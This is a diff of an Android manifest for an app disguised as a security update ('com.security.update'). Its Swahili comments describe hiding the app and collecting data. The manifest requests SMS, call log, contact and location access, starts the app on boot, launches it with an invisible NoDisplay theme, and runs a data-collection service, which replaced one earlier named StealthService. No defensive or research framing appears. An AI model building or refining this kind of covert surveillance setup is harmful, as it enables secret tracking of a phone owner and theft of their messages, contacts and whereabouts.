@@ -2,41 +2,36 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.security.update">
 
-    <!-- SYSTEM PERMISSIONS -->
-    <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
         android:allowBackup="true"
-        android:label="System Services"
-        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
-        android:persistent="true">
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme">
 
-        <!-- LAUNCHER ACTIVITY - INAONEKANA MWANZO TU -->
+        <!-- ACTIVITY YA KUJIFICHA -->
         <activity
             android:name=".LoginActivity"
             android:exported="true"
-            android:excludeFromRecents="true">
+            android:theme="@style/Theme.AppCompat.NoDisplay">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- STEALTH SERVICE - INATEGEMEA BACKGROUND -->
-        <service
-            android:name=".StealthService"
-            android:enabled="true"
-            android:exported="false" />
+        <!-- SERVICE ZA KUOKOTA DATA -->
+        <service android:name=".DataCollectionService" />
 
-        <!-- BOOT RECEIVER - AUTO START -->
+        <!-- RECEIVER YA BOOT COMPLETE -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -46,5 +41,6 @@
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
+
     </application>
 </manifest>
